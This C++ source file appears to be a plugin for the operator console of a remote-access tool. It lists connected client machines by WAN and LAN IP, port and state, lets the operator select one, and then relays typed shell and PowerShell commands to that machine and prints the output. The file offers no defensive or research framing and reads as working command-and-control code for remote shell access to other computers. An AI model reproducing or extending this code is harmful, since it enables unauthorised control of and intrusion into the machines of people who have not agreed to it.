#include "..\\definehead.h"
#include <iostream>
#include <conio.h>
using std::cerr;
using std::cin;
using std::cout;
using std::endl;
using std::istringstream;
using std::to_string;
extern "C" int EXPORT sendClientList(SOCKET &s)
{
      int clientNum = 0;
      cout << "__________Clients List__________" << endl;
      cout << "Client Ref\t\tWanIp\t\tLanIP\t\tClient Connect Port\t\tClient Satte\n";
      while (true)
      {
            string recvBuf;
            receive_message(s, recvBuf);
            if (strcmp(string(recvBuf).c_str(), "\r\n\r\nend\r\n\r\n") == 0)
            {
                  break;
            }

            clientNum++;
            string srecv = recvBuf;
            istringstream iss(srecv);
            string clientWanIp, clientLanIp, clientPort, clientState;
            iss >> clientWanIp >> clientLanIp >> clientPort >> clientState;
            cout << clientNum << "\t\t" << clientWanIp << "\t" << clientLanIp << "\t" << clientPort << "\t\t";
            switch (stoi(clientState))
            {
            case 0:
                  cout << "UnKnown" << endl;
                  break;
            case 1:
                  cout << "Online" << endl;
                  break;
            case 2:
                  cout << "Offline" << endl;
                  break;
            case 3:
                  cout << "Use" << endl;
                  break;
            }
      }
      if (clientNum == 0)
      {
            cout << "No Clients\n";
      }
      cout << "__________Clients List__________" << endl;
      cout << "Cin 0 to exit:";
      return clientNum;
}
extern "C" bool EXPORT run(allInfoStruct &info)
{
      SOCKET &sockC = info.NowSocket;
      system("cls");
      send_message(sockC, "connect");
      string recvBuf;
      string srecv, cmds;
      int kb_cin = -1;
      bool flag_First = true;

      while (1)
      {
            system("cls");
            int clientNum = 0;
            string clientNumStr;
            int kb_cin = -1;
            clientNum = sendClientList(sockC);
            if (_kbhit())
            {
                  getline(cin, clientNumStr);
                  if (!std::regex_match(clientNumStr, only_number))
                  {
                        Sleep(500);
                        send_message(sockC, "\r\nnext\r\n");
                        continue;
                  }
                  kb_cin = stoi(clientNumStr);
                  if (kb_cin == 0)
                  {
                        system("pause");
                        send_message(sockC, "\r\nexit\r\n");
                        break;
                  }
                  if (kb_cin > 0 && kb_cin <= clientNum)
                  {
                        send_message(sockC, to_string(kb_cin));
                        while (true && flag_First)
                        {
                              receive_message(sockC, recvBuf);
                              if (recvBuf == "\r\n\r\nend\r\n\r\n")
                                    break;
                        }
                        flag_First = false;
                        receive_message(sockC, recvBuf);
                        if (recvBuf == "\r\n\r\nsec\r\n\r\n")
                        {
                              system("cls");
                              receive_message(sockC, recvBuf);
                              cout << recvBuf;
                              if (recvBuf == "\r\n\r\nfail\r\n\r\n")
                              {
                                    std::cerr << "UnKonwn ERROR!" << endl;
                              }
                              else if (recvBuf == "\r\n\r\nfailn\r\n\r\n")
                              {
                                    receive_message(sockC, recvBuf);
                              }
                              int qt = 1;
                              while (1)
                              {
                                    getline(cin, cmds);
                                    if (cmds == "powershell")
                                    {
                                          send_message(sockC, (cmds + "\r\n\r\n"));
                                          receive_message(sockC, recvBuf);
                                          cout << recvBuf.substr(recvBuf.find('\n') + 1);

                                          send_message(sockC, "\r\n");
                                          receive_message(sockC, recvBuf);
                                          cout << recvBuf.substr(recvBuf.find('\n') + 1);

                                          send_message(sockC, "\r\n");
                                          receive_message(sockC, recvBuf);
                                          cout << recvBuf.substr(recvBuf.find('\n') + 1);
                                          qt++;
                                          continue;
                                    }
                                    else if (strcmp(cmds.c_str(), "exit") == 0)
                                    {
                                          qt--;
                                          if (qt == 0)
                                          {
                                                send_message(sockC, "\r\nfexit\r\n");
                                                break;
                                          }
                                    }
                                    else if (strcmp(cmds.c_str(), "cls") == 0)
                                    {
                                          system("cls");
                                    }
                                    send_message(sockC, (cmds + "\r\n"));
                                    receive_message(sockC, recvBuf);
                                    cout << recvBuf.substr(recvBuf.find('\n') + 1);
                              }
                        }
                        else
                        {
                              cout << "ERROR" << endl;
                              system("pause");
                              Sleep(500);
                              send_message(sockC, "\r\nnext\r\n");
                        }
                  }
                  else
                  {
                        Sleep(500);
                        send_message(sockC, "\r\nnext\r\n");
                  }
            }
            else
            {
                  Sleep(500);
                  send_message(sockC, "\r\nnext\r\n");
            }
      }
      receive_message(sockC, recvBuf);
      return true;
}